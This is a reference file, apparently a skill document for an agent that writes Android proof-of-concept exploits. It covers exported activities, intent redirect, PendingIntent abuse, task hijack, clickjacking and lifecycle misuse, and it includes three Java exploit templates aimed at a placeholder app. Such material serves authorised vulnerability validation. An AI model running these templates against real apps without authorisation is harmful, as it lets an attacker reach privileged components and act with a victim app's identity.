---
name: poc-app-activity
description: Activity PoC reference covering exported access, intent redirect, fragment injection, path traversal, PendingIntent abuse, result leakage, task hijack, clickjacking, and lifecycle misuse.
---

# Activity PoC Reference

Use this reference for attacker-reachable activity flows. Activity PoCs usually fit `direct-trigger`, `returned-handle`, or `ui-assisted` mode.

## Construction Matrix

| Vulnerability | Exploit mode | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| exported access | `direct-trigger` | none | protected screen or action becomes reachable |
| intent redirect | `direct-trigger` | none | nested Intent reaches internal component |
| fragment injection | `direct-trigger` | none | internal fragment is loaded |
| path traversal | `direct-trigger` | none | attacker-controlled path is accepted |
| PendingIntent abuse | `returned-handle` | none | victim-identity action executes |
| `setResult()` leak | `interception` | helper activity for result capture | sensitive result is returned |
| task hijack | `ui-assisted` | helper activity in Manifest | victim task shows attacker UI |
| clickjacking | `ui-assisted` | overlay service | user-facing trusted action is obscured |
| lifecycle misuse | `ui-assisted` | none | protected resource remains active after backgrounding |

## Shared Inputs

- victim activity class
- launch action, extras, URI, or nested Intent key
- whether the flow needs `startActivityForResult()`
- whether helper Manifest components are required
- visible success signal

## Pattern 1 - Direct Activity Launch

Use for exported access, intent redirect, fragment injection, and many path-traversal cases.

```java
public final class ActivityIntentRedirectExploit extends Exploit {
    public ActivityIntentRedirectExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent nested = new Intent();
        nested.setClassName("com.target", "com.target.InternalAdminActivity");
        nested.putExtra("admin_cmd", "grant_permission");

        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.ForwardActivity");
        intent.putExtra("forward_intent", nested);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        log("Launched com.target.ForwardActivity with nested attacker-controlled Intent");
    }
}
```

Fill with:

- real target class
- real nested Intent key or fragment selector
- real path, URI, or command extras from the verified finding

## Pattern 2 - Returned Handle or Result Flow

Use for `ActivityPendingIntentAbuseExploit` or `ActivitySetResultLeakExploit`.

```java
public final class ActivityPendingIntentAbuseExploit extends Exploit {
    public ActivityPendingIntentAbuseExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent malicious = new Intent();
        malicious.setClassName("com.target", "com.target.PrivilegedActivity");

        PendingIntent pendingIntent = PendingIntent.getActivity(
            context,
            0,
            malicious,
            PendingIntent.FLAG_MUTABLE
        );

        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.ExecutePendingIntentActivity");
        intent.putExtra("pending_intent", pendingIntent);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        log("Delivered attacker-controlled PendingIntent to exported activity");
    }
}
```

Use when:

- the activity accepts a `PendingIntent` from an external caller, or
- the activity returns sensitive data via `setResult()` and the PoC can capture it with a helper activity

Manifest support for `setResult()`:

- add a helper capture activity if the result must be programmatically observed

## Pattern 3 - UI-Assisted Validation

Use for task hijack, clickjacking, and lifecycle misuse.

```java
public final class ActivityLifecycleExploit extends Exploit {
    public ActivityLifecycleExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent camera = new Intent();
        camera.setClassName("com.target", "com.target.CameraActivity");
        camera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(camera);

        new Handler().postDelayed(() -> {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(home);
            log("Moved target activity to background. Check whether the protected resource remains active.");
        }, 2000);
    }
}
```

Manifest support:

- helper activity with matching `taskAffinity` for task hijack
- helper service with overlay permission for clickjacking

Do not use `ui-assisted` mode for ordinary exported launches that already prove the bug.
